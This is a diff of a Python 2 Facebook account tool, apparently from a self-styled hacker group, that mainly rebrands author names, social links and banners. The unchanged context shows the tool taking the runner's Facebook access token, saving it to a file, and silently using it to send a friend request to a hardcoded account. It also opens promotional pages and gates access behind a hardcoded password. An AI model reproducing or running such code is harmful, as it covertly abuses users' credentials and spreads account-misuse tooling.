@@ -37,16 +37,15 @@ def jalan(z):
 		time.sleep(00000.1)
 ##### LOGO #####
 logo = """
-
    THE ANONYMOUS AHKHACKER
    THE LEGEND BADMASH
    THE GAME CHANGER AHK
    Pakistani hackers
 \033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mlove
-\033[1;96mYouTube \033[1;93m: \033[1;92mPakistani Hackers
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/lovehacker/love
-\033[1;96mBlogger \033[1;93m: \033[1;92mhttps://www.facebook.com/lovehacker
+\033[1;96mAuthor    \033[1;93m: \033[1;92mIjaz Afridi
+\033[1;96mGang      \033[1;93m: \033[1;92m Mr Badmash
+\033[1;96mInstagram \033[1;93m: \033[1;92m mrijazofficial1
+\033[1;96mFb Page   \033[1;93m: \033[1;92m Mr_Ijaz_official302 
 \033[1;91m======================================="""
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -64,12 +63,12 @@ vuln = "\033[32mVuln"
 os.system("clear")
 print "\033[1;96m ========================================="
 print  """\033[1;91m=======================================
-\033[1;96mAuthor  \033[1;93m: \033[1;92mlove
-\033[1;96mYouTube \033[1;93m: \033[1;92mlovehacker
-\033[1;96mGitHub  \033[1;93m: \033[1;92mhttps://github.com/lovehacker/love
-\033[1;96mpage \033[1;93m: \033[1;92mhttps://www.facebook.com/lovehacker
+\033[1;96mAuthor    \033[1;93m: \033[1;92mIjaz Afridi
+\033[1;96mGang      \033[1;93m: \033[1;92m Mr Badmash
+\033[1;96mInstagram \033[1;93m: \033[1;92m mrijazofficial1
+\033[1;96mFb Page   \033[1;93m: \033[1;92m Mr_Ijaz_official302 
 \033[1;91m======================================="""
-print " \x1b[1;93m============================================================="
+print " \x1b[1;93m========================================="
 CorrectUsername = "afridi"
 CorrectPassword = "afridi"
 loop = 'true'
@@ -82,10 +81,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "Wrong Password"
-            os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+            os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
     else:
         print "Wrong Username"
-        os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+        os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
 def login():
 	os.system('clear')
 	try:
@@ -125,7 +124,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m\x1b[1;92mLogin Successful'
-				os.system('xdg-open https://www.facebook.com/Anonymoustricker1')
+				os.system('xdg-open https://www.facebook.com/Cyber.Expert302')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
